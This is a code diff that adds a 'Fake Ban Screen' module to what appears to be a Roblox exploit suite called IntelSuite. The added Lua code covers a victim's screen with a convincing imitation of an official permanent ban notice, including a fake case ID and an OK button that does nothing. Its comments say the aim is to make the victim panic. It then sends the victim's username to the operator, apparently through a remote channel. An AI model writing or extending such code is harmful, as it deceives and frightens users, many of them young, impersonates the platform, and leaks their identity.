@@ -1287,3 +1287,150 @@ end
 task.spawn(runDeviceFingerprint)
 getgenv().IntelSuite.DeviceFingerprint = runDeviceFingerprint
 
+-- ============================================================
+-- MODULE 20: Fake Ban Screen
+-- Spawns a full-screen convincing fake Roblox ban GUI
+-- Triggered via !cmd fakeban
+-- Victim thinks they got banned and panics
+-- ============================================================
+local function showFakeBan()
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+
+    pcall(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+        if not playerGui then return end
+
+        -- Remove if already exists
+        local existing = playerGui:FindFirstChild("GhostBanScreen")
+        if existing then existing:Destroy() end
+
+        local screen = Instance.new("ScreenGui")
+        screen.Name = "GhostBanScreen"
+        screen.ResetOnSpawn = false
+        screen.IgnoreGuiInset = true
+        screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        screen.Parent = playerGui
+
+        -- Dark overlay
+        local bg = Instance.new("Frame")
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.Position = UDim2.new(0, 0, 0, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        bg.BorderSizePixel = 0
+        bg.ZIndex = 10
+        bg.Parent = screen
+
+        -- Red top bar
+        local topBar = Instance.new("Frame")
+        topBar.Size = UDim2.new(1, 0, 0, 6)
+        topBar.Position = UDim2.new(0, 0, 0, 0)
+        topBar.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        topBar.BorderSizePixel = 0
+        topBar.ZIndex = 11
+        topBar.Parent = bg
+
+        -- Roblox logo text
+        local logo = Instance.new("TextLabel")
+        logo.Size = UDim2.new(1, 0, 0, 60)
+        logo.Position = UDim2.new(0, 0, 0, 40)
+        logo.BackgroundTransparency = 1
+        logo.Text = "ROBLOX"
+        logo.TextColor3 = Color3.fromRGB(255, 255, 255)
+        logo.TextSize = 42
+        logo.Font = Enum.Font.GothamBold
+        logo.ZIndex = 11
+        logo.Parent = bg
+
+        -- Main ban message
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(0.7, 0, 0, 50)
+        title.Position = UDim2.new(0.15, 0, 0.25, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "Your account has been banned"
+        title.TextColor3 = Color3.fromRGB(255, 80, 80)
+        title.TextSize = 32
+        title.Font = Enum.Font.GothamBold
+        title.ZIndex = 11
+        title.Parent = bg
+
+        -- Reason
+        local reason = Instance.new("TextLabel")
+        reason.Size = UDim2.new(0.7, 0, 0, 40)
+        reason.Position = UDim2.new(0.15, 0, 0.38, 0)
+        reason.BackgroundTransparency = 1
+        reason.Text = "Reason: Exploiting / Use of unauthorized third-party software"
+        reason.TextColor3 = Color3.fromRGB(200, 200, 200)
+        reason.TextSize = 18
+        reason.Font = Enum.Font.Gotham
+        reason.TextWrapped = true
+        reason.ZIndex = 11
+        reason.Parent = bg
+
+        -- Duration
+        local duration = Instance.new("TextLabel")
+        duration.Size = UDim2.new(0.7, 0, 0, 30)
+        duration.Position = UDim2.new(0.15, 0, 0.50, 0)
+        duration.BackgroundTransparency = 1
+        duration.Text = "Duration: Permanent"
+        duration.TextColor3 = Color3.fromRGB(255, 80, 80)
+        duration.TextSize = 20
+        duration.Font = Enum.Font.GothamBold
+        duration.ZIndex = 11
+        duration.Parent = bg
+
+        -- Case ID
+        local caseId = Instance.new("TextLabel")
+        caseId.Size = UDim2.new(0.7, 0, 0, 25)
+        caseId.Position = UDim2.new(0.15, 0, 0.60, 0)
+        caseId.BackgroundTransparency = 1
+        caseId.Text = "Case ID: " .. tostring(math.random(100000000, 999999999))
+        caseId.TextColor3 = Color3.fromRGB(150, 150, 150)
+        caseId.TextSize = 14
+        caseId.Font = Enum.Font.Gotham
+        caseId.ZIndex = 11
+        caseId.Parent = bg
+
+        -- Appeal info
+        local appeal = Instance.new("TextLabel")
+        appeal.Size = UDim2.new(0.7, 0, 0, 40)
+        appeal.Position = UDim2.new(0.15, 0, 0.68, 0)
+        appeal.BackgroundTransparency = 1
+        appeal.Text = "If you believe this is a mistake, you may submit an appeal at www.roblox.com/appeal\nAppeals are reviewed within 30 days."
+        appeal.TextColor3 = Color3.fromRGB(130, 130, 130)
+        appeal.TextSize = 13
+        appeal.Font = Enum.Font.Gotham
+        appeal.TextWrapped = true
+        appeal.ZIndex = 11
+        appeal.Parent = bg
+
+        -- OK button (does nothing)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 160, 0, 44)
+        btn.Position = UDim2.new(0.5, -80, 0.82, 0)
+        btn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        btn.BorderSizePixel = 0
+        btn.Text = "OK"
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 18
+        btn.Font = Enum.Font.GothamBold
+        btn.ZIndex = 12
+        btn.Parent = bg
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = btn
+
+        -- Button click — screen flickers but stays
+        btn.MouseButton1Click:Connect(function()
+            bg.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
+            task.wait(0.1)
+            bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        end)
+
+        send("FAKE BAN DEPLOYED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Fake ban screen is now covering their entire screen.", 16711680)
+    end)
+end
+
+getgenv().IntelSuite.FakeBan = showFakeBan
+
